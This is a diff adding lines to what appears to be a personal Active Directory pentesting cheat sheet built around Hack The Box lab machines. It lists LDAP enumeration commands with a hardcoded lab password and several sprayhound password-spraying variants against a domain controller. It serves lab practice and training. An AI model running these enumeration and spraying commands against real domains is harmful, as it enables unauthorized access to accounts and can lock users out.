@@ -11,8 +11,31 @@ python /opt/impacket/examples/GetUserSPNs.py active.local/svc_user -dc-ip 10.10.
 
 #GetADUsers
 GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/svc-alfresco
+python3 /opt/windapsearch/windapsearch.py -u support\\ldap  -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -U  
+ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
+ldapdomaindump -u 'support\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' dc.support.htb
 
 nmap 192.168.130.169 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
+
+#Some ldap enumeration & password spraying
+
+crackmapexec smb 10.10.11.174 --users 
+
+# Single user, single password
+sprayhound -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -dc 10.10.11.174 --force
+
+# User list, single password
+sprayhound -U ./users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -dc 10.10.11.174 --force
+
+# User as pass
+sprayhound -U ./users.txt -d support.htb -dc 10.10.11.174 --force
+
+# User as pass with password lowercase
+sprayhound -U ./users.txt --lower -d support.htb -dc 10.10.11.174 --force
+
+# User as pass with password uppercase
+sprayhound -U ./users.txt --upper -d support.htb -dc 10.10.11.174 --force
+
 
 ###Some rights meaning 
 #ref: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
